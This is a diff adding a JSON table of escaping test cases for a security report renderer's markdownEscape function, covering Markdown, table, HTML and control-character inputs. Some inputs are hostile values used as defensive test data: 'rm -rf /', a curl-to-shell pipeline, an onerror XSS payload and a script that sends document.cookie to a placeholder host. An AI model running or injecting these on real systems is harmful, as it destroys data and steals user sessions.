@@ -1,0 +1,107 @@
+{
+  "why_this_file_exists": "markdownEscape has ONE implementation (TypeScript), so it is not a shared/conformance corpus — those exist to keep several languages identical. It is table-driven anyway because it is the boundary between a scanned target's bytes and a document a person reads, and a table is auditable: a reviewer reads the cases, not the regexes. A case added here is a claim about what a target cannot do to a report.",
+  "value_forms": "`value` is the JSON value passed to markdownEscape. Where JSON cannot express the input, `special` names it instead: undefined, nan, infinity, bigint, date, function. Exactly one of `out` (the expected string) or `throws` (a substring of the expected error message) is present.",
+  "sections": {
+    "structure": {
+      "why": "A value must not be able to write Markdown. These are the characters that would, each on its own, so a reviewer can see none is missing.",
+      "cases": [
+        { "why": "the backslash is escaped exactly once, not twice: it is in the same regex pass as everything else", "value": "a\\b", "out": "a\\\\b" },
+        { "why": "a backslash already escaping something stays one level deep", "value": "\\*", "out": "\\\\\\*" },
+        { "why": "emphasis", "value": "*bold* _under_", "out": "\\*bold\\* \\_under\\_" },
+        { "why": "code span", "value": "run `whoami`", "out": "run \\`whoami\\`" },
+        { "why": "a code FENCE inside a value cannot open a block", "value": "```sh\nrm -rf /\n```", "out": "\\`\\`\\`sh rm \\-rf / \\`\\`\\`" },
+        { "why": "a heading cannot start", "value": "# not a heading", "out": "\\# not a heading" },
+        { "why": "a list cannot start", "value": "- item\n+ item", "out": "\\- item \\+ item" },
+        { "why": "a link cannot form", "value": "[text](javascript:alert(1))", "out": "\\[text\\]\\(javascript:alert\\(1\\)\\)" },
+        { "why": "an image cannot form", "value": "![alt](http://x/y.png)", "out": "\\!\\[alt\\]\\(http://x/y.png\\)" },
+        { "why": "braces, for the templating languages downstream of a Markdown reader", "value": "{{ x }} {% y %}", "out": "\\{\\{ x \\}\\} \\{% y %\\}" },
+        { "why": "angle brackets: autolinks and raw HTML both start with one", "value": "<https://x> <b>", "out": "\\<https://x\\> \\<b\\>" },
+        { "why": "GFM strikethrough", "value": "~~gone~~", "out": "\\~\\~gone\\~\\~" }
+      ]
+    },
+    "table_breakout": {
+      "why": "Acceptance test 2. The pipe is the character a value most plausibly contains by accident — a shell pipeline, a regex alternation, a User-Agent — and the one that silently adds a column to somebody else's table.",
+      "cases": [
+        { "why": "a pipe cannot end a cell", "value": "a|b", "out": "a\\|b" },
+        { "why": "the test's own value: pipe, newline and emphasis land in ONE cell as text", "value": "x | y\n**z**", "out": "x \\| y \\*\\*z\\*\\*" },
+        { "why": "a value that looks like a whole table row", "value": "| col | col |\n|---|---|", "out": "\\| col \\| col \\| \\|\\-\\-\\-\\|\\-\\-\\-\\|" },
+        { "why": "a curl pipeline, the realistic case", "value": "curl -s http://t/ | sh", "out": "curl \\-s http://t/ \\| sh" }
+      ]
+    },
+    "html": {
+      "why": "Acceptance test 3. Escaping is the first of two defences; the pipeline also drops every html node after parsing. This section pins the first, so neither is load-bearing alone.",
+      "cases": [
+        { "why": "the test's own payload becomes text", "value": "<img src=x onerror=alert(1)>", "out": "\\<img src=x onerror=alert\\(1\\)\\>" },
+        { "why": "a script tag in a VALUE, as opposed to in a template", "value": "<script>fetch('//x/'+document.cookie)</script>", "out": "\\<script\\>fetch\\('//x/'\\+document.cookie\\)\\</script\\>" },
+        { "why": "an HTML comment cannot open", "value": "<!-- -->", "out": "\\<\\!\\-\\- \\-\\-\\>" }
+      ]
+    },
+    "line_breaks": {
+      "why": "There is no way to escape a line break in Markdown: a backslash before one IS a hard break, and inside a table row a raw newline ends the row. So a value cannot be allowed to carry one, and all three forms collapse to a single space.",
+      "cases": [
+        { "why": "LF", "value": "a\nb", "out": "a b" },
+        { "why": "CRLF becomes ONE space, not two: the pair is matched before the singles", "value": "a\r\nb", "out": "a b" },
+        { "why": "bare CR, which an HTTP response line gives you", "value": "a\rb", "out": "a b" },
+        { "why": "mixed endings in one value", "value": "a\r\nb\nc\rd", "out": "a b c d" },
+        { "why": "a trailing newline does not become a hard break", "value": "a\n", "out": "a " },
+        { "why": "two newlines cannot start a new paragraph", "value": "a\n\nb", "out": "a  b" }
+      ]
+    },
+    "controls": {
+      "why": "An invisible difference between what a report says and what it contains is a lie about evidence. Tab becomes a space; every other C0 and DEL is removed. Inside a {% code %} block these same bytes SURVIVE and are shown as markers — that is evidence, and a different rule, in codeTag.ts.",
+      "cases": [
+        { "why": "NUL is removed. A raw NUL in a text file makes grep call it binary and find nothing in it — this repo has already paid for that once, in packages/svelte/src/infra/load.ts", "value": "a\u0000b", "out": "ab" },
+        { "why": "tab becomes a space, so it cannot be mistaken for cell alignment", "value": "a\tb", "out": "a b" },
+        { "why": "BEL, ESC and the rest of C0 are removed", "value": "a\u0007\u001bb", "out": "ab" },
+        { "why": "an ANSI escape sequence loses its ESC and reads as the text it is", "value": "\u001b[31mred\u001b[0m", "out": "\\[31mred\\[0m" },
+        { "why": "vertical tab and form feed, which some renderers treat as line breaks", "value": "a\u000bb\u000cc", "out": "abc" },
+        { "why": "DEL is removed. §4.2 of the spec lists C0 only, §9.2 lists 'other C0 control characters and DEL': the two halves disagree and this follows the stricter one", "value": "a\u007fb", "out": "ab" },
+        { "why": "a control character cannot sit between a backslash and the character it escapes", "value": "a\u0000*b", "out": "a\\*b" }
+      ]
+    },
+    "unicode_kept": {
+      "why": "Escaping must not become mangling. A report on a target in another script is still a report, and a finding whose bytes were altered on the way to the page is not evidence.",
+      "cases": [
+        { "why": "CJK is untouched", "value": "製品一覧", "out": "製品一覧" },
+        { "why": "an emoji with a zero-width joiner survives whole", "value": "👩‍💻", "out": "👩‍💻" },
+        { "why": "combining marks are not separated from their base", "value": "é vs é", "out": "é vs é" },
+        { "why": "a non-breaking space stays a non-breaking space: it is not C0", "value": "a\u00a0b", "out": "a\u00a0b" },
+        { "why": "a right-to-left override is NOT removed today, and is listed so the decision is visible rather than absent. Trojan Source reordering inside a report is an open question for the ADR; recording current behaviour here means a change to it has to change a test", "value": "a\u202eb", "out": "a\u202eb" }
+      ]
+    },
+    "scalars": {
+      "why": "Numbers and booleans cannot carry Markdown, so they are stringified and not escaped. null and undefined are an author's 'nothing here' and print nothing — which is NOT the same as an unknown variable, already a render error by then under strictVariables.",
+      "cases": [
+        { "why": "an integer", "value": 12480, "out": "12480" },
+        { "why": "a negative number keeps its sign unescaped even though '-' is a special: String() of a number cannot produce Markdown", "value": -3, "out": "-3" },
+        { "why": "a float", "value": 3.5, "out": "3.5" },
+        { "why": "true", "value": true, "out": "true" },
+        { "why": "false prints 'false', it does not vanish", "value": false, "out": "false" },
+        { "why": "null prints nothing", "value": null, "out": "" },
+        { "why": "undefined prints nothing", "special": "undefined", "out": "" },
+        { "why": "NaN prints itself rather than an empty cell, which would read as a measurement of zero", "special": "nan", "out": "NaN" },
+        { "why": "Infinity likewise", "special": "infinity", "out": "Infinity" },
+        { "why": "a bigint, which JSON cannot hold but a count of bytes can reach", "special": "bigint", "out": "9007199254740993" },
+        { "why": "a Date renders ISO 8601 UTC rather than erroring, because a report full of timestamps should not need a filter", "special": "date", "out": "2026\\-10\\-06T12:00:00.000Z" },
+        { "why": "the empty string is empty, not absent", "value": "", "out": "" }
+      ]
+    },
+    "refused": {
+      "why": "A composite value is a TEMPLATE BUG, and a report that prints [object Object] has turned a bug into a finished document nobody can tell is wrong. The error names the shape and the fix, and never quotes the value: this message reaches a stored snapshot, a console page and every log on the way.",
+      "cases": [
+        { "why": "an object: the author meant to pick a field", "value": { "a": 1 }, "throws": "pick a field" },
+        { "why": "an array: the author meant to loop", "value": [1, 2], "throws": "loop over it" },
+        { "why": "an empty object is refused too — printing nothing would hide the bug", "value": {}, "throws": "pick a field" },
+        { "why": "an empty array likewise", "value": [], "throws": "loop over it" },
+        { "why": "an array of rows, the realistic mistake: {{ result.price_changes }}", "value": [{ "sku": "A" }], "throws": "loop over it" },
+        { "why": "a function could only come from a context this module built, so it is named rather than coerced", "special": "function", "throws": "type function" }
+      ]
+    },
+    "size": {
+      "why": "Escaping never truncates. A value too large for a report is a size-cap decision made in render.ts against a stated limit, not a silent cut made here.",
+      "cases": [
+        { "why": "a 100k-character value passes through, escaped, at full length", "special": "long", "out": "long" }
+      ]
+    }
+  }
+}
